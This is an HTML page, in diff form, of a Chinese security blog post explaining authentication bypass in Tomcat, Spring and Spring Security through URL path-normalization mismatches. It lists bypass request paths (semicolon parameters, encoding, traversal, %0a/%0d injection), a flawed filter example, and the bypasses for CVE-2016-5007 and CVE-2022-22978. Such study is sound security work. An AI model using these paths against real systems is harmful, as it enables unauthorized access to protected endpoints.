@@ -1,0 +1,627 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Shiro/Spring权限绕过 | micgo's blog</title><meta name="keywords" content="shiro权限绕过,spring权限绕过"><meta name="author" content="micgo"><meta name="copyright" content="micgo"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="MVC框架  MVC：Model-View-Controller，即控制器（Controller），模型（Model），视图（View） 使用MVC模式的好处是，Controller专注于业务处理，它的处理结果就是Model。Model可以是一个JavaBean，也可以是一个包含多个对象的Map，Controller只负责把Model传递给View，View只负责把Model给“渲染”出来，这样，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Shiro&#x2F;Spring权限绕过">
+<meta property="og:url" content="https://micgo.top/%E6%B8%97%E9%80%8F/%E9%89%B4%E6%9D%83/index.html">
+<meta property="og:site_name" content="micgo&#39;s blog">
+<meta property="og:description" content="MVC框架  MVC：Model-View-Controller，即控制器（Controller），模型（Model），视图（View） 使用MVC模式的好处是，Controller专注于业务处理，它的处理结果就是Model。Model可以是一个JavaBean，也可以是一个包含多个对象的Map，Controller只负责把Model传递给View，View只负责把Model给“渲染”出来，这样，">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg">
+<meta property="article:published_time" content="2024-02-27T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-03-10T08:42:18.342Z">
+<meta property="article:author" content="micgo">
+<meta property="article:tag" content="shiro权限绕过">
+<meta property="article:tag" content="spring权限绕过">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg"><link rel="shortcut icon" href="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230225215514.jpg"><link rel="canonical" href="https://micgo.top/%E6%B8%97%E9%80%8F/%E9%89%B4%E6%9D%83/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Shiro/Spring权限绕过',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-03-10 16:42:18'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="micgo's blog" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230225215514.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">48</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">38</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">micgo's blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Shiro/Spring权限绕过</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-02-27T16:00:00.000Z" title="发表于 2024-02-28 00:00:00">2024-02-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-03-10T08:42:18.342Z" title="更新于 2024-03-10 16:42:18">2024-03-10</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Shiro/Spring权限绕过"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h3 id="MVC框架"><a href="#MVC框架" class="headerlink" title="MVC框架"></a>MVC框架</h3><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20240224181838444.png" alt="image-20240224181838444" style="zoom:50%;" />
+
+<p>MVC：Model-View-Controller，即控制器（Controller），模型（Model），视图（View）</p>
+<p>使用MVC模式的好处是，Controller专注于业务处理，它的处理结果就是Model。Model可以是一个JavaBean，也可以是一个包含多个对象的Map，Controller只负责把Model传递给View，View只负责把Model给“渲染”出来，这样，三者职责明确，且开发更简单，因为开发Controller时无需关注页面，开发View时无需关心如何创建Model</p>
+<h3 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h3><p>Servlet 是一个实现了特定接口的 Web 组件，由 Servlet 容器去加载并运行。<code>容器</code> 本身并不一定是 Web 服务器，但容器需要至少支持 HTTP 请求，并将请求的内容封装成 Servlet 接口的参数；因此容器通常与 Web 服务器集成或者作为其拓展而存在。目前常见的 Servlet 容器如 Tomcat、GlassFish、JBoss 等，同样也具备 Web 服务器的功能</p>
+<ul>
+<li>Servlet：能处理HTTP请求并将HTTP响应返回</li>
+<li>JSP：一种嵌套Java代码的HTML，将被编译为Servlet</li>
+<li>Filter：能过滤指定的URL以实现拦截功能</li>
+<li>Listener：监听指定的事件，如ServletContext、HttpSession的创建和销毁</li>
+</ul>
+<h3 id="SpringBoot"><a href="#SpringBoot" class="headerlink" title="SpringBoot"></a><strong>SpringBoot</strong></h3><p>核心功能</p>
+<ul>
+<li><strong>起步依赖</strong></li>
+</ul>
+<p>起步依赖本质上是一个Maven项目对象模型（Project Object Model，POM），定义了对其他库的传递依 赖，这些东西加在一起即支持某项功能<br>简单的说，起步依赖就是将具备某种功能的坐标打包到一起，并提供一些默认的功能</p>
+<ul>
+<li><strong>自动配置</strong></li>
+</ul>
+<p>Spring Boot的自动配置是一个运行时（更准确地说，是应用程序启动时）的过程，考虑了众多因素，才决定 Spring配置应该用哪个，不该用哪个。该过程是Spring自动完成的</p>
+<h3 id="威胁模型"><a href="#威胁模型" class="headerlink" title="威胁模型"></a>威胁模型</h3><p>Java Web 应用的请求流程，大致可以抽象成如下的链路:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Client</span> -&gt; <span class="title class_">Filter</span>_1 -&gt; <span class="title class_">Filter</span>_2 -&gt; ... -&gt; <span class="title class_">Filter</span>_n -&gt; <span class="title class_">Servlet</span></span><br></pre></td></tr></table></figure>
+
+<p>即客户端的请求会经过一个或者多个 Filter，然后再到达实际处理请求的 Servlet 中。通常 Filter 以级联方式运作，称为 FilterChain，而出于低耦合的设计模式考虑，开发者一般会将重要的鉴权逻辑放在 Filter 中实现。一旦认证失败，可以提前终止请求，这对于 Servlet 而言是透明的。</p>
+<p>因此所谓的鉴权绕过，很多情况下就是鉴权 Filter 中的逻辑错误。而 Filter 中的鉴权，大部分情况下也是 URL 粒度的鉴权，毕竟在一个网站中总是会有无需认证的前台界面(如登录界面)，以及需要认证的后台服务(如管理后台)</p>
+<p>从代码上看，Filter 中鉴权使用的多是 HttpServletRequest.getRequestURI() 接口，判断对应路径是否需要鉴权，如果需要则进行 Session 的判断和认证，对于鉴权失败的请求则返回 403 拒绝访问或者 302 跳转到登录界面</p>
+<p>大多的路径归一化问题是因为鉴权的过滤器或者拦截器对于url的处理与spring最后对路由分发时的处理不一致，导致鉴权失败，从而可以未授权访问系统</p>
+<h3 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h3><p>首先是第一步，<code>parsePathParameters</code>，该方法会解析 Path Parameter 即路径参数，路径参数是针对每一级 URL 目录的参数，形如 <code>/api;a=b/flag;c=d</code>，使用 分号 <code>;</code> 进行指定，并以等号 <code>=</code> 指定 key 和 value。解析路径参数之后会将其使用 <code>Request.addPathParameter</code> 加入到请求信息中，并且将其从 decodeURI 中删除<br>第二步，URL Decode，正常的 URL 解码<br>第三步，Normalization，主要针对 URL 中包含 “\“, “&#x2F;&#x2F;”, “&#x2F;.&#x2F;” 以及 “&#x2F;..&#x2F;” 的情况，操作过程如下:</p>
+<ol>
+<li>将 <code>\</code> 替换为 <code>/</code>；</li>
+<li>将 <code>//</code> 替换为 <code>/</code>；</li>
+<li>对于 <code>/.</code> 或者 <code>/..</code> 结尾的 URI，先在末尾额外添加一个 <code>/</code>；</li>
+<li>递归解析 URI 中的 <code>/./</code> 字符串，将其替换为 <code>/</code>；</li>
+<li>递归解析 URI 中的 <code>/../</code> 字符串，移动相应的目录；</li>
+</ol>
+<p>在解析 <code>/../</code> 时如果超出了根目录会直接返回 false。此外一些其他的错误也会返回 false，比如 <code>CoyoteAdapter#ALLOW_BACKSLASH</code> 为 false 却包含反斜杠，路径不以 <code>/</code> 或者 <code>\</code> 开头等。</p>
+<p>第四步，Character decoding，使用 convertURI 对路径进行字符解码。因为此时的路径还是以 <code>ByteChunk</code> 的格式进行存储的，这一步会将其转换为 <code>CharChunk</code>；</p>
+<p>在依次经过上述处理后，最终的 URI 才会用来进行 Servlet 路由查找</p>
+<h4 id="Bypass-Tricks"><a href="#Bypass-Tricks" class="headerlink" title="Bypass Tricks"></a>Bypass Tricks</h4><p>据此，我们可以得到一系列 “Bypass Tricks”，即用不同的方式路由到同一个 Servlet 中，比如目标路由是 <code>/api/flag</code> 的话，以下请求都能寻址到目标:</p>
+<ul>
+<li><code>/api;a=b/flag</code>: 通过 Path Parameter 路径参数变异；</li>
+<li><code>/api/%66%6C%61%67</code>: 通过 URL 编码进行变异；</li>
+<li><code>\api\flag</code>: 通过 Normalization 1 变异，当前需要 Tomcat 配置 <code>ALLOW_BACKSLASH</code> 为 <code>true</code>；</li>
+<li><code>//api/flag</code>: 通过 Normalization 2&#x2F;3 变异;</li>
+<li><code>/api/./flag</code>: 通过 Normalization 4 变异；</li>
+<li><code>/foo/api/../api/flag</code>: 通过 Normalization 5 变异；</li>
+</ul>
+<p>这些变异方法可以相互组合进行使用，另外配合 DefaultServlet 针对磁盘文件和资源的路由也可以组合出其他的 URI</p>
+<h3 id="removeSemicolonContentInternal"><a href="#removeSemicolonContentInternal" class="headerlink" title="removeSemicolonContentInternal"></a>removeSemicolonContentInternal</h3><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20240226170040313.png" alt="image-20240226170040313"></p>
+<p>removeSemicolonContentInternal这个函数主要做了两件事:<br>1、移除所有的分号<br>2、移除分号后面直到下一个斜杠”&#x2F;”之间的所有字符</p>
+<p>因此</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20240226170225295.png" alt="image-20240226170225295" style="zoom:87%;" />
+
+<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20240226170312162.png" alt="image-20240226170312162"></p>
+<h3 id="鉴权案例"><a href="#鉴权案例" class="headerlink" title="鉴权案例"></a>鉴权案例</h3><h4 id="starts-x2F-endswith"><a href="#starts-x2F-endswith" class="headerlink" title="starts&#x2F;endswith"></a>starts&#x2F;endswith</h4><p>springweb对请求的处理：url先经过过滤器，如果过滤器中逻辑稍有不当，便有可能存在绕过鉴权的情况</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">requestUri</span> <span class="operator">=</span>  request.getRequestURI();</span><br><span class="line"><span class="keyword">if</span>(requestUri.endsWith(“js”))&#123;</span><br><span class="line">   filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这是一个常见的对静态文件不进行鉴权的过滤器，然而此时则可以通过**&#x2F;api&#x2F;xxxxxx;js**对该鉴权进行绕过。因为filter处理url时if是通过了if的逻辑，而到了spring的doDispatch中则由刚刚所述的处理，将其分发到了&#x2F;api&#x2F;xxxxxx正确对应的接口<br>由此产生了很多鉴权问题，在filter之中对url处理稍有不慎变会导致该问题的产生</p>
+<h4 id="某OA"><a href="#某OA" class="headerlink" title="某OA"></a>某OA</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">path</span><span class="params">(String path)</span> &#123;</span><br><span class="line">   path = <span class="built_in">this</span>.uriDecode(path);</span><br><span class="line">   <span class="keyword">if</span> (path != <span class="literal">null</span> &amp;&amp; path.indexOf(<span class="string">&quot;\\&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">      path = StringUtil.replace(path, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;/&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (path != <span class="literal">null</span> &amp;&amp; path.indexOf(<span class="string">&quot;..&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">      path = StringUtil.replace(path, <span class="string">&quot;\\.&#123;2,&#125;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (path != <span class="literal">null</span> &amp;&amp; path.indexOf(<span class="string">&quot;./&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">      path = StringUtil.replace(path, <span class="string">&quot;./&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (path != <span class="literal">null</span> &amp;&amp; path.indexOf(<span class="string">&quot;;&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">      path = StringUtil.replace(path, <span class="string">&quot;;.*?/&quot;</span>, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (path != <span class="literal">null</span> &amp;&amp; path.indexOf(<span class="string">&quot;;&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">      path = StringUtil.replace(path, <span class="string">&quot;;.*&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (path != <span class="literal">null</span> &amp;&amp; path.indexOf(<span class="string">&quot;//&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">      path = StringUtil.replace(path, <span class="string">&quot;/&#123;2,&#125;&quot;</span>, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (path != <span class="literal">null</span>) &#123;</span><br><span class="line">      path = StringUtil.replace(path, <span class="string">&quot;\\s&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (!path.equals(<span class="string">&quot;&quot;</span>) &amp;&amp; !path.startsWith(<span class="string">&quot;/&quot;</span>)) &#123;</span><br><span class="line">      path = <span class="string">&quot;/&quot;</span> + path;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> path;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> String <span class="title function_">uriDecode</span><span class="params">(String path)</span> &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (path != <span class="literal">null</span> &amp;&amp; path.indexOf(<span class="string">&quot;%&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> URLDecoder.decode(path);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (Exception var3) &#123;</span><br><span class="line">      <span class="built_in">this</span>.writeLog(<span class="string">&quot;uri decode error:&quot;</span> + path, <span class="literal">true</span>);</span><br><span class="line">      <span class="built_in">this</span>.writeError(var3);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> path;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先 URI 解码，然后替换反斜杠，也不管 URI 的标准了，<code>..</code> 直接删掉，路径参数也直接删掉，还有空格、<code>//</code> 之类的都进行了处理，看起来无懈可击。但其实仔细看一下会发现还是有一些问题:</p>
+<ul>
+<li>uriDecode 中可能会失败，导致根本没解码成功而返回原始的路径；</li>
+<li>URI 解码之后，路径可能会存在大写，如果是 WIndows 中请求 JSP 等文件可以正确路由；</li>
+<li>路径参数的删除在 <code>./</code> 之后，所以 <code>.;xxx/</code> 处理后依旧存在 <code>./</code>；</li>
+<li>删除空格 <code>\s</code> 在归一化 <code>//</code> 之后，所以 <code>/%20/</code> 依旧可以绕过替换返回 <code>//</code>；</li>
+<li>…</li>
+</ul>
+<p>可见尽管有时候开发者知道要过滤什么字符，但是思维局限不够发散全面，写出的代码依旧漏洞百出。因此，更为科学的方案是使用知名的、经过检验的鉴权框架，而不是尝试自己处理</p>
+<h3 id="alwaysUseFullPath"><a href="#alwaysUseFullPath" class="headerlink" title="alwaysUseFullPath"></a>alwaysUseFullPath</h3><p>alwaysUseFullPath主要用于判断是否使用servlet context中的全路径匹配处理器，会对路径进行规范化处理</p>
+<p>小于等于<strong>spring-boot-autoconfigure-2.3.0.RELEASE</strong>默认为false，会获取ServletPath并进行对应的处理，主要是对uri标准化处理，例如解码然后处理跨目录等一系列操作<br>大于<strong>spring-boot-autoconfigure-2.3.0.RELEASE</strong>默认为true，当请求路径中包括类似<code>..</code>的关键词时，调用getPathWithinApplication方法解析后，会因为没有处理跨目录的字符，导致找不到对应的Handler而返回404</p>
+<p>例如：<br>当alwaysUseFullPath为false时，调用了getPathWithinServletMapping进行处理，跨目录字符解码并规范化后，成功匹配对应的handler并访问成功</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20240226213459988.png" alt="image-20240226213459988" style="zoom:82%;" />
+
+<p>当alwaysUseFullPath为true时，调用的是getPathWithinApplication，没有对跨目录进行标准化处理，最终找不到对应的handler，返回404状态码</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20240226213525506.png" alt="image-20240226213525506" style="zoom:80%;" />
+
+
+
+
+
+<h3 id="SuffixPatternMatch-x2F-TrailingSlashMatch-后缀-x2F-结尾匹配模式"><a href="#SuffixPatternMatch-x2F-TrailingSlashMatch-后缀-x2F-结尾匹配模式" class="headerlink" title="SuffixPatternMatch&#x2F;TrailingSlashMatch(后缀&#x2F;结尾匹配模式)"></a>SuffixPatternMatch&#x2F;TrailingSlashMatch(后缀&#x2F;结尾匹配模式)</h3><p>低版本的 spring-webmvc 及其相关组件，包括：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">spring-webmvc &lt;= 5.2.4.RELEASE</span><br><span class="line">spring-framework &lt;= 5.2.6.RELEASE</span><br></pre></td></tr></table></figure>
+
+<p><strong>SuffixPatternMatch</strong>是后缀匹配模式，用于能以 .xxx 结尾的方式进行匹配。这里46对应的Ascii码是<code>.</code>，根据具体代码可以知道，当启用后缀匹配模式时，例如&#x2F;hello和&#x2F;hello.do的匹配结果是一样的</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20240227143453250.png" alt="image-20240227143453250" style="zoom:77%;" />
+
+<p><strong>TrailingSlashMatch</strong>为true时，会应用尾部的 **&#x2F; ** 匹配，例如&#x2F;hello和&#x2F;hello&#x2F;的匹配结果是一样的：</p>
+<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20240227143547649.png" alt="image-20240227143547649"></p>
+<p>假设存在资源文件 <code>resources/static/secret.txt</code>，对应的路由是 <code>/secret.txt</code>，可以使用下面的变体:</p>
+<ol>
+<li><code>/secret.txt/</code>: 预处理时候会变成 <code>secret.txt</code> 删除前方以及末尾的分隔符；</li>
+<li><code>/;/secret.txt</code>: 预处理时候删除连续的分隔符，和 <code>//</code> 的差别是处理阶段不同；</li>
+<li><code>/secret.txt;a=b</code> <code>/secret;a=b.txt</code>: 预处理时候会删除路径参数；</li>
+<li><code>\secret.txt</code>: 基于 processPath 中将 <code>\</code> 替换成 <code>/</code> 的变异；</li>
+<li><code>//secret.txt</code>: 基于 cleanDuplicateSlashes 的变异，因此前面遗留的连续分隔符不会影响；</li>
+<li><code>/   / // secret.txt</code>: 基于 cleanLeadingSlash 的变异；</li>
+<li><code>/secret.%74%78%74</code>: 寻找文件前会通过 encodeOrDecodeIfNecessary 进行 URL 解码；</li>
+<li><code>/foo/.././/secret.txt</code>: createRelative 中会组合路径，并将其当做最终路径；</li>
+</ol>
+<p>这些路径变异方式可以组合进行使用，从而根据需要构造出更加复杂的变异。值得注意的是其中某些变异可能会在 Web 容器就被拦截，比如Tomcat在碰到路径中包含(未编码的)空格时会直接返回400错误</p>
+<p>\x00</p>
+<h3 id="Spring-security-认证绕过"><a href="#Spring-security-认证绕过" class="headerlink" title="Spring-security 认证绕过"></a>Spring-security 认证绕过</h3><h4 id="CVE-2016-5007"><a href="#CVE-2016-5007" class="headerlink" title="CVE-2016-5007"></a>CVE-2016-5007</h4><p>影响版本：<br>Spring Security 3.2.x，4.0.x，4.1.0</p>
+<p>访问控制匹配器不识别受保护的路径，因此应用默认的“允许”规则，而控制器查找器匹配器找到受保护的控制器。两个匹配器之间的严格性不匹配导致了这种情况。<br>该漏洞危害性高低与否取决越权查看页面后查询数据的时候是否有校验当前用户的session</p>
+<p>绕过方式： 在URL中将空格(或其他空格字符)附加到受保护路径前后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/admin%20/</span><br><span class="line">/%20admin/</span><br><span class="line">/%0dadmin/</span><br><span class="line">/admin%0d/</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="CVE-2022-22978"><a href="#CVE-2022-22978" class="headerlink" title="CVE-2022-22978"></a>CVE-2022-22978</h4><p>影响版本：<br>Spring Security 5.5.x &lt; 5.5.7       Spring Security 5.6.x &lt; 5.6.4</p>
+<p>当Spring-security使用 RegexRequestMatcher 进行权限配置，由于RegexRequestMatcher正则表达式配置权限的特性，正则表达式中包含“.”时，利用换行符可实现权限认证进行绕过</p>
+<p>绕过方式：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/admin%0a</span><br><span class="line">/admin%0d%0a</span><br><span class="line">/admin%0d</span><br></pre></td></tr></table></figure>
+
+
+
